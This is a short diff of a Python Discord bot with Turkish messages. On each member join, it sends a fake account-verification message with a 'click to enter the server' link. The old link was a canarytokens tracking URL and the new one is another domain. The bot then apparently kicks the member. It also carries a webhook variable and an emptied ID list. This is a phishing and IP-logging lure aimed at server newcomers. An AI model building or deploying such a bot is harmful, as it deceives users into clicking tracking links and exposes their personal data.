@@ -13,7 +13,7 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 vebhuk = 'https://discord.com/api/webhook'
 
 
-agalar = [1231241241242142, 1241241412412]
+agalar = []
 
 @bot.event
 async def on_ready():
@@ -34,7 +34,7 @@ async def on_member_join(member):
         current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
 
-        await member.send(f"Sunucu Davet Bağlantısı: {invite_link}\nGiriş Zamanı: {current_time} Sunucuya girebilmek için hesabını doğrulat \n\n\n[SUNUCUYA GİRMEK İÇİN TIKLA](http://canarytokens.com/traffic/images/stuff/i9z0kryjpdn92x3hdy2pn5q6w/index.html)")
+        await member.send(f"Sunucu Davet Bağlantısı: {invite_link}\nGiriş Zamanı: {current_time} Sunucuya girebilmek için hesabını doğrulat \n\n\n[SUNUCUYA GİRMEK İÇİN TIKLA](zarttirizort.com)")
 
 
         await asyncio.sleep(0.1)
@@ -51,4 +51,4 @@ async def on_member_join(member):
         print(f"{member.name}#{member.discriminator} sunucudan atılırken hata oluştu: {e}")
 
 
-bot.run('TOKEN')
+bot.run('')
